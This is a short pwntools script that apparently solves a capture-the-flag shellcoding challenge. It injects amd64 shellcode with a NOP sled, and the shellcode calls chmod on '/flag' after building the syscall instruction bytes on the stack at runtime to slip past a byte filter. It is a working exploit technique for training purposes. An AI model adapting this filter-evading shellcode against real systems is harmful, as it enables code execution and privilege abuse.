#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/syscall-shenanigans')

shellcode = asm("""
# chmod("/flag",0777)
	xor rax, rax
	mov al, 90
	lea rdi, [rip+filename]
	xor rsi, rsi
	mov si, 511
	xor rcx, rcx
	mov cx, 0x050e
	inc cx
	push rcx
	mov byte ptr [rsp + 2], 0xc3
	mov rbx, rsp
	call rbx
	filename:
	.string "/flag"
	""")

io = process()
io.send(b"\x90"*0x1000+shellcode)
io.interactive()
print(disasm(shellcode))
